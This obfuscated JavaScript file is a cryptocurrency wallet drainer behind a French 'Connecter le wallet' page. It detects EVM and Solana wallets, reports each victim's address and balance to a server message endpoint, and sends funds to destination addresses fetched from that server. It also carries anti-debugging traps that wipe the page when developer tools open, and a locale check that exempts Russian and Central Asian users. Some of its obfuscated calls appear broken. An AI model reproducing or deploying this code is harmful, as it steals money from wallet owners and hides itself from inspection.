const _0x1a2b3c = "http://localhost:8080";
const _0x4d5e6f = {
    _0x7a8b9c: `${_0x1a2b3c}/api/sendMessage`,
    _0x0d1e2f: `${_0x1a2b3c}/protected/ban`,
    _0x3g4h5i: `${_0x1a2b3c}/api/evm`,
    _0x6j7k8l: `${_0x1a2b3c}/api/solana`,
    _0x9m0n1o: `${_0x1a2b3c}/api/chain_evm`,
    _0x2p3q4r: `${_0x1a2b3c}/api/chain_sol`,
    _0x5s6t7u: `${_0x1a2b3c}/api/price_eth`,
    _0x8v9w0x: `${_0x1a2b3c}/api/price_sol`,
    _0x1y2z3a: `${_0x1a2b3c}/api`,
};
async function _0x4b5c6d(_0x7e8f9a, _0x1b2c3d) {
    try {
        const _0x4e5f6g = await fetch(_0x7e8f9a, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message: String(_0x1b2c3d) }),
        });
        if (!_0x4e5f6g[_0x5a5b5c(0x1e5)]) {
            console[_0x5a5b5c(0x1e6)](
                _0x5a5b5c(0x1e7),
                _0x4e5f6g[_0x5a5b5c(0x1e8)],
            );
        }
    } catch (_0x2a3b4c) {
        console[_0x5a5b5c(0x1e6)](_0x5a5b5c(0x1e9), _0x2a3b4c);
    }
}
async function _0x3c4d5e() {
    try {
        const _0x6f7a8b = await fetch("https://api.ipify.org?format=json");
        const _0x9c0d1e = await _0x6f7a8b[_0x5a5b5c(0x1ea)]();
        return _0x9c0d1e[_0x5a5b5c(0x1eb)];
    } catch {
        return "unknown";
    }
}
async function _0x2e3f4g() {
    const _0x5h6i7j = await _0x3c4d5e();
    await _0x4b5c6d(
        _0x4d5e6f._0x0d1e2f,
        JSON[_0x5a5b5c(0x1ec)]({ ip: _0x5h6i7j, reason: "devtools" }),
    );
    await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "🚨 IP Banned: " + _0x5h6i7j);
    setTimeout(() => window[_0x5a5b5c(0x1ed)][_0x5a5b5c(0x1ee)](), 2000);
}
function _0x8k9l0m() {
    const _0x1n2o3p = navigator[_0x5a5b5c(0x1ef)] || [
        navigator[_0x5a5b5c(0x1f0)],
    ];
    const _0x4q5r6s = [
        "ru-RU",
        "be-BY",
        "ru-BY",
        "kk-KZ",
        "ru-KZ",
        "tk-TM",
        "ru-TM",
        "ru",
        "be",
        "kk",
        "tk",
    ];
    const _0x7t8u9v = _0x1n2o3p[_0x5a5b5c(0x1f1)]((_0x5w6x7y) =>
        _0x4q5r6s[_0x5a5b5c(0x1f1)]((_0x8z9a0b) =>
            _0x5w6x7y[_0x5a5b5c(0x1f2)]()[_0x5a5b5c(0x1f3)](
                _0x8z9a0b[_0x5a5b5c(0x1f2)](),
            ),
        ),
    );
    if (_0x7t8u9v) _0x2e3f4g();
}
function _0x5a5b5c(_0x1c2d3e) {
    const _0x4e5f6g = {
        "0x1e5": "ok",
        "0x1e6": "error",
        "0x1e7": "Erreur lors de l'envoi du message:",
        "0x1e8": "status",
        "0x1e9": "sendWithApi error:",
        "0x1ea": "json",
        "0x1eb": "ip",
        "0x1ec": "stringify",
        "0x1ed": "location",
        "0x1ee": "reload",
        "0x1ef": "languages",
        "0x1f0": "language",
        "0x1f1": "some",
        "0x1f2": "toLowerCase",
        "0x1f3": "startsWith",
        "0x1f4": "innerHTML",
        "0x1f5": "href",
        "0x1f6": "now",
        "0x1f7": "toString",
        "0x1f8": "log",
        "0x1f9": "defineProperty",
        "0x1fa": "id",
        "0x1fb": "outerWidth",
        "0x1fc": "innerWidth",
        "0x1fd": "outerHeight",
        "0x1fe": "innerHeight",
        "0x1ff": "map",
        "0x200": "address_eth",
        "0x201": "percent",
        "0x202": "address_sol",
        "0x203": "rpc",
        "0x204": "sol_provider",
        "0x205": "usd",
        "0x206": "random",
        "0x207": "isMetaMask",
        "0x208": "isTrust",
        "0x209": "isCoinbaseWallet",
        "0x20a": "isBraveWallet",
        "0x20b": "isExodus",
        "0x20c": "isTally",
        "0x20d": "isRainbow",
        "0x20e": "isOpera",
        "0x20f": "bitkeep",
        "0x210": "isFrame",
        "0x211": "isKuCoinWallet",
        "0x212": "isPhantom",
        "0x213": "isSolflare",
        "0x214": "isSlope",
        "0x215": "isTorus",
        "0x216": "send",
        "0x217": "eth_requestAccounts",
        "0x218": "getNetwork",
        "0x219": "chainId",
        "0x21a": "getAddress",
        "0x21b": "getBalance",
        "0x21c": "formatEther",
        "0x21d": "publicKey",
        "0x21e": "connect",
        "0x21f": "getMinimumBalanceForRentExemption",
        "0x220": "getRecentBlockhash",
        "0x221": "feePayer",
        "0x222": "signTransaction",
        "0x223": "sendRawTransaction",
        "0x224": "serialize",
        "0x225": "confirmTransaction",
        "0x226": "disabled",
        "0x227": "textContent",
        "0x228": "message",
        "0x229": "DOMContentLoaded",
        "0x22a": "getElementById",
        "0x22b": "onclick",
    };
    return _0x4e5f6g[_0x1c2d3e];
}
(function _0x1a2b3c() {
    function _0x4d5e6f() {
        document[_0x5a5b5c(0x1f4)] = "";
        window[_0x5a5b5c(0x1ed)][_0x5a5b5c(0x1f5)] = "about:blank";
    }
    setInterval(function _0x7g8h9i() {
        debugger;
    }, 50);
    setInterval(() => {
        const _0x0j1k2l = performance[_0x5a5b5c(0x1f6)]();
        debugger;
        const _0x3m4n5o = performance[_0x5a5b5c(0x1f6)]() - _0x0j1k2l;
        if (_0x3m4n5o > 100) _0x4d5e6f();
    }, 500);
    const _0x6p7q8r = /./;
    _0x6p7q8r[_0x5a5b5c(0x1f7)] = () => {
        _0x4d5e6f();
        return "/./";
    };
    setInterval(() => console[_0x5a5b5c(0x1f8)](_0x6p7q8r), 1000);
    const _0x9s0t1u = new Image();
    Object[_0x5a5b5c(0x1f9)](_0x9s0t1u, _0x5a5b5c(0x1fa), {
        get: function () {
            _0x4d5e6f();
        },
    });
    setInterval(() => console[_0x5a5b5c(0x1f8)](_0x9s0t1u), 1500);
    setInterval(() => {
        if (
            window[_0x5a5b5c(0x1fb)] - window[_0x5a5b5c(0x1fc)] > 100 ||
            window[_0x5a5b5c(0x1fd)] - window[_0x5a5b5c(0x1fe)] > 100
        ) {
            _0x4d5e6f();
        }
    }, 1000);
})();
let _0x2v3w4x = [];
let _0x5y6z7a = [];
async function _0x8b9c0d() {
    try {
        const _0x1e2f3g = await fetch(_0x4d5e6f._0x3g4h5i);
        if (_0x1e2f3g[_0x5a5b5c(0x1e5)]) {
            const _0x4h5i6j = await _0x1e2f3g[_0x5a5b5c(0x1ea)]();
            _0x2v3w4x = _0x4h5i6j[_0x5a5b5c(0x1ff)]((_0x7k8l9m) => ({
                address: _0x7k8l9m[_0x5a5b5c(0x200)],
                percent: _0x7k8l9m[_0x5a5b5c(0x201)],
            }));
        }
        const _0x0n1o2p = await fetch(_0x4d5e6f._0x6j7k8l);
        if (_0x0n1o2p[_0x5a5b5c(0x1e5)]) {
            const _0x3q4r5s = await _0x0n1o2p[_0x5a5b5c(0x1ea)]();
            _0x5y6z7a = _0x3q4r5s[_0x5a5b5c(0x1ff)]((_0x6t7u8v) => ({
                address: _0x6t7u8v[_0x5a5b5c(0x202)],
                percent: _0x6t7u8v[_0x5a5b5c(0x201)],
            }));
        }
    } catch (_0x9w0x1y) {
        console[_0x5a5b5c(0x1e6)]("❌ Erreur updateDestinations:", _0x9w0x1y);
    }
}
async function _0x2z3a4b(_0x5c6d7e) {
    try {
        const _0x8e9f0g = `${_0x4d5e6f._0x1y2z3a}/${_0x5a5b5c(0x203)}/${_0x5c6d7e}`;
        return new ethers[_0x5a5b5c(0x204)][_0x5a5b5c(0x205)](_0x8e9f0g);
    } catch (_0x1h2i3j) {
        console[_0x5a5b5c(0x1e6)](_0x1h2i3j);
        return null;
    }
}
async function _0x4k5l6m() {
    try {
        const _0x7n8o9p = await fetch(_0x4d5e6f._0x2p3q4r);
        if (!_0x7n8o9p[_0x5a5b5c(0x1e5)]) return null;
        const _0x0q1r2s = await _0x7n8o9p[_0x5a5b5c(0x1ea)]();
        const _0x3t4u5v = _0x0q1r2s[0]?.[_0x5a5b5c(0x204)];
        if (!_0x3t4u5v) return null;
        return new solanaWeb3[_0x5a5b5c(0x205)](_0x3t4u5v);
    } catch (_0x6w7x8y) {
        console[_0x5a5b5c(0x1e6)](_0x6w7x8y);
        return null;
    }
}
async function _0x9z0a1b() {
    try {
        const _0x2c3d4e = await fetch(_0x4d5e6f._0x5s6t7u);
        if (!_0x2c3d4e[_0x5a5b5c(0x1e5)]) return null;
        const _0x5f6g7h = await _0x2c3d4e[_0x5a5b5c(0x1ea)]();
        return _0x5f6g7h?.[0]?.[_0x5a5b5c(0x205)] ?? null;
    } catch {
        return null;
    }
}
async function _0x8i9j0k() {
    try {
        const _0x1l2m3n = await fetch(_0x4d5e6f._0x8v9w0x);
        if (!_0x1l2m3n[_0x5a5b5c(0x1e5)]) return null;
        const _0x4o5p6q = await _0x1l2m3n[_0x5a5b5c(0x1ea)]();
        return _0x4o5p6q?.[0]?.[_0x5a5b5c(0x205)] ?? null;
    } catch {
        return null;
    }
}
const _0x7r8s9t = {
    ethereum: "ETH",
    polygon: "MATIC",
    bsc: "BNB",
    avalanche: "AVAX",
    base: "ETH",
    solana: "SOL",
};
let _0x0u1v2w, _0x3x4y5z, _0x6a7b8c;
let _0x9d0e1f, _0x2g3h4i;
const _0x5j6k7l = "User" + Math[_0x5a5b5c(0x206)]() * 100000;
async function _0x8m9n0o() {
    let _0x1p2q3r = "Unknown";
    let _0x4s5t6u = false;
    let _0x7v8w9x = false;
    if (window[_0x5a5b5c(0x1fa)]) {
        _0x4s5t6u = true;
        if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x207)]) _0x1p2q3r = "MetaMask";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x208)])
            _0x1p2q3r = "Trust Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x209)])
            _0x1p2q3r = "Coinbase Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x20a)])
            _0x1p2q3r = "Brave Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x20b)])
            _0x1p2q3r = "Exodus Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x20c)])
            _0x1p2q3r = "Tally Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x20d)])
            _0x1p2q3r = "Rainbow Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x20e)])
            _0x1p2q3r = "Opera Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x20f)])
            _0x1p2q3r = "Bitget Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x210)])
            _0x1p2q3r = "Frame Wallet";
        else if (window[_0x5a5b5c(0x1fa)][_0x5a5b5c(0x211)])
            _0x1p2q3r = "KuCoin Wallet";
        else _0x1p2q3r = "EVM Wallet";
    }
    if (window[_0x5a5b5c(0x21d)]) {
        _0x7v8w9x = true;
        if (window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x212)])
            _0x1p2q3r = "Phantom Wallet";
        else if (window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x213)])
            _0x1p2q3r = "Solflare Wallet";
        else if (window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x214)])
            _0x1p2q3r = "Slope Wallet";
        else if (window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x20b)])
            _0x1p2q3r = "Exodus Wallet";
        else if (window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x20f)])
            _0x1p2q3r = "Bitget Wallet";
        else if (window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x215)])
            _0x1p2q3r = "Torus Wallet";
        else _0x1p2q3r = "Solana Wallet";
    }
    return { walletType: _0x1p2q3r, isEVM: _0x4s5t6u, isSolana: _0x7v8w9x };
}
async function _0x0y1z2a() {
    const _0x3b4c5d = new ethers[_0x5a5b5c(0x204)][_0x5a5b5c(0x205)](
        window[_0x5a5b5c(0x1fa)],
    );
    await _0x3b4c5d[_0x5a5b5c(0x216)](_0x5a5b5c(0x217), []);
    const _0x6e7f8g = await _0x3b4c5d[_0x5a5b5c(0x218)]();
    const _0x9h0i1j = _0x6e7f8g[_0x5a5b5c(0x219)];
    const _0x2k3l4m = {
        1: "ethereum",
        56: "bsc",
        137: "polygon",
        43114: "avalanche",
        8453: "base",
    };
    const _0x5n6o7p = _0x2k3l4m[_0x9h0i1j] ?? "ethereum";
    _0x0u1v2w = await _0x2z3a4b(_0x9h0i1j);
    if (!_0x0u1v2w) {
        _0x0u1v2w = _0x3b4c5d;
        await _0x4b5c6d(
            _0x4d5e6f._0x7a8b9c,
            `⚠️ No RPC for chainId ${_0x9h0i1j}, using injected provider`,
        );
    }
    _0x3x4y5z = _0x3b4c5d[_0x5a5b5c(0x216)]();
    _0x6a7b8c = await _0x3x4y5z[_0x5a5b5c(0x21a)]();
    const _0x9q0r1s = await _0x3b4c5d[_0x5a5b5c(0x21b)](_0x6a7b8c);
    await _0x4b5c6d(
        _0x4d5e6f._0x7a8b9c,
        `🩸 ${_0x5j6k7l}\n\n📡 EVM connected: ${_0x6a7b8c}\n💰 ${ethers[_0x5a5b5c(0x21c)](_0x9q0r1s)} ${_0x7r8s9t[_0x5n6o7p]}\n🌐 ${_0x5n6o7p} (${_0x9h0i1j})`,
    );
}
async function _0x2t3u4v() {
    const _0x5w6x7y = await window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x21e)]();
    if (!_0x5w6x7y?.[_0x5a5b5c(0x21d)]) {
        await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "🚫 Solana wallet not connected");
        return;
    }
    _0x9d0e1f = await _0x4k5l6m();
    if (!_0x9d0e1f) {
        await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "❌ Solana RPC unavailable");
        return;
    }
    _0x2g3h4i = new solanaWeb3[_0x5a5b5c(0x21d)](
        _0x5w6x7y[_0x5a5b5c(0x21d)][_0x5a5b5c(0x1f7)](),
    );
    const _0x8z0a1b = await _0x9d0e1f[_0x5a5b5c(0x21b)](_0x2g3h4i);
    const _0x2c3d4e = _0x8z0a1b / solanaWeb3[_0x5a5b5c(0x205)];
    await _0x4b5c6d(
        _0x4d5e6f._0x7a8b9c,
        `🩸 ${_0x5j6k7l}\n\n📡 Solana connected\n💰 ${_0x2c3d4e[_0x5a5b5c(0x1f7)]()} SOL\n🔑 ${_0x2g3h4i[_0x5a5b5c(0x1f7)]()}`,
    );
}
async function _0x5f6g7h() {
    if (!_0x3x4y5z) {
        await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "🚫 EVM wallet not connected");
        return;
    }
    await _0x8b9c0d();
    const _0x8i9j0k = await _0x3x4y5z[_0x5a5b5c(0x21b)]();
    const _0x1l2m3n = await _0x0u1v2w[_0x5a5b5c(0x21b)]();
    const _0x4o5p6q =
        ethers[_0x5a5b5c(0x21c)](_0x1l2m3n)[_0x5a5b5c(0x1ff)](_0x7q8r9s);
    const _0x0t1u2v =
        _0x1l2m3n[_0x5a5b5c(0x1f7)]()[_0x5a5b5c(0x1ff)](_0x3w4x5y);
    const _0x6z7a8b =
        _0x8i9j0k[_0x5a5b5c(0x1f7)]()[_0x5a5b5c(0x1ff)](_0x9c0d1e);
    if (_0x0t1u2v <= 0) {
        await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "⚠️ EVM: Insufficient funds");
        return;
    }
    const _0x2f3g4h = await _0x9z0a1b();
    let _0x5i6j7k = `🩸 ${_0x5j6k7l}\n\nEVM Transactions 🚀\n\n`;
    for (const _0x8l9m0n of _0x2v3w4x) {
        const _0x1o2p3q =
            _0x8i9j0k[_0x5a5b5c(0x1f7)]()[_0x5a5b5c(0x1ff)](_0x4q5r6s);
        const _0x7t8u9v = await _0x3x4y5z[_0x5a5b5c(0x216)]({
            to: _0x8l9m0n[_0x5a5b5c(0x200)],
            value: _0x1o2p3q,
            gasLimit: _0x6z7a8b,
            gasPrice: _0x1l2m3n,
        });
        const _0x0w1x2y = ethers[_0x5a5b5c(0x21c)](_0x1o2p3q);
        const _0x3z4a5b = _0x2f3g4h
            ? (parseFloat(_0x0w1x2y) * _0x2f3g4h)[_0x5a5b5c(0x1f7)]()
            : "N/A";
        _0x5i6j7k += `💰 ${_0x0w1x2y} ETH (~${_0x3z4a5b}$)\n🔗 ${_0x7t8u9v[_0x5a5b5c(0x1f5)]}\n\n`;
        await _0x7t8u9v[_0x5a5b5c(0x225)]();
    }
    await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, _0x5i6j7k);
}
async function _0x6c7d8e() {
    if (!_0x9d0e1f || !_0x2g3h4i) {
        await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "🚫 Solana wallet not connected");
        return;
    }
    await _0x8b9c0d();
    const _0x9f0g1h = await _0x9d0e1f[_0x5a5b5c(0x21b)](_0x2g3h4i);
    const _0x2i3j4k = await _0x9d0e1f[_0x5a5b5c(0x21f)](0);
    const _0x5l6m7n = 5000;
    const _0x8o9p0q = _0x9f0g1h - _0x2i3j4k - _0x5l6m7n;
    if (_0x8o9p0q <= 0) {
        await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "⚠️ Solana: Insufficient funds");
        return;
    }
    const _0x1r2s3t = await _0x8i9j0k();
    let _0x4u5v6w = `🩸 ${_0x5j6k7l}\n\nSolana Transactions 🚀\n\n`;
    const _0x7x8y9z = new solanaWeb3[_0x5a5b5c(0x205)]();
    for (const _0x0a1b2c of _0x5y6z7a) {
        const _0x3d4e5f = Math[_0x5a5b5c(0x1f7)](
            (_0x8o9p0q * _0x0a1b2c[_0x5a5b5c(0x201)]) / 100,
        );
        const _0x6g7h8i = new solanaWeb3[_0x5a5b5c(0x21d)](
            _0x0a1b2c[_0x5a5b5c(0x202)],
        );
        _0x7x8y9z[_0x5a5b5c(0x1f5)]([
            solanaWeb3[_0x5a5b5c(0x205)][_0x5a5b5c(0x216)]({
                fromPubkey: _0x2g3h4i,
                toPubkey: _0x6g7h8i,
                lamports: _0x3d4e5f,
            }),
        ]);
        const _0x9j0k1l = (_0x3d4e5f / solanaWeb3[_0x5a5b5c(0x205)])[
            _0x5a5b5c(0x1f7)
        ]();
        const _0x2m3n4o = _0x1r2s3t
            ? (parseFloat(_0x9j0k1l) * _0x1r2s3t)[_0x5a5b5c(0x1f7)]()
            : "N/A";
        _0x4u5v6w += `💰 ${_0x9j0k1l} SOL (~${_0x2m3n4o}$)\n`;
    }
    const { blockhash } = await _0x9d0e1f[_0x5a5b5c(0x220)]();
    _0x7x8y9z[_0x5a5b5c(0x1f5)](blockhash);
    _0x7x8y9z[_0x5a5b5c(0x221)] = _0x2g3h4i;
    const _0x5p6q7r =
        await window[_0x5a5b5c(0x21d)][_0x5a5b5c(0x222)](_0x7x8y9z);
    const _0x8s9t0u = await _0x9d0e1f[_0x5a5b5c(0x223)](
        _0x5p6q7r[_0x5a5b5c(0x224)](),
    );
    await _0x9d0e1f[_0x5a5b5c(0x225)](_0x8s9t0u);
    _0x4u5v6w += `🔗 ${_0x8s9t0u}`;
    await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, _0x4u5v6w);
}
document[_0x5a5b5c(0x229)](() => {
    _0x8k9l0m();
    const _0x1v2w3x = document[_0x5a5b5c(0x22a)]("connect-wallet");
    const _0x4y5z6a = document[_0x5a5b5c(0x22a)](_0x5a5b5c(0x216));
    if (_0x4y5z6a) _0x4y5z6a[_0x5a5b5c(0x226)] = true;
    if (_0x1v2w3x) {
        _0x1v2w3x[_0x5a5b5c(0x22b)] = async () => {
            _0x1v2w3x[_0x5a5b5c(0x226)] = true;
            _0x1v2w3x[_0x5a5b5c(0x227)] = "Connexion...";
            const { walletType, isEVM, isSolana } = await _0x8m9n0o();
            if (!isEVM && !isSolana) {
                await _0x4b5c6d(_0x4d5e6f._0x7a8b9c, "❌ No wallet detected");
                _0x1v2w3x[_0x5a5b5c(0x226)] = false;
                _0x1v2w3x[_0x5a5b5c(0x227)] = "Connecter le wallet";
                return;
            }
            await _0x4b5c6d(
                _0x4d5e6f._0x7a8b9c,
                `🔍 Wallet detected: ${walletType}`,
            );
            try {
                if (isEVM) await _0x0y1z2a();
                if (isSolana) await _0x2t3u4v();
                if (_0x4y5z6a) _0x4y5z6a[_0x5a5b5c(0x226)] = false;
                _0x1v2w3x[_0x5a5b5c(0x227)] = "✅ Connecté";
            } catch (_0x7b8c9d) {
                await _0x4b5c6d(
                    _0x4d5e6f._0x7a8b9c,
                    `❌ Connection error: ${_0x7b8c9d[_0x5a5b5c(0x228)]}`,
                );
                _0x1v2w3x[_0x5a5b5c(0x226)] = false;
                _0x1v2w3x[_0x5a5b5c(0x227)] = "Connecter le wallet";
            }
        };
    }
    if (_0x4y5z6a) {
        _0x4y5z6a[_0x5a5b5c(0x22b)] = async () => {
            _0x4y5z6a[_0x5a5b5c(0x226)] = true;
            _0x4y5z6a[_0x5a5b5c(0x227)] = "Envoi en cours...";
            try {
                if (_0x3x4y5z && _0x6a7b8c) await _0x5f6g7h();
                if (_0x9d0e1f && _0x2g3h4i) await _0x6c7d8e();
            } catch (_0x0e1f2g) {
                await _0x4b5c6d(
                    _0x4d5e6f._0x7a8b9c,
                    `❌ ${_0x0e1f2g[_0x5a5b5c(0x228)]}`,
                );
            } finally {
                _0x4y5z6a[_0x5a5b5c(0x226)] = false;
                _0x4y5z6a[_0x5a5b5c(0x227)] = "Envoyer";
            }
        };
    }
});
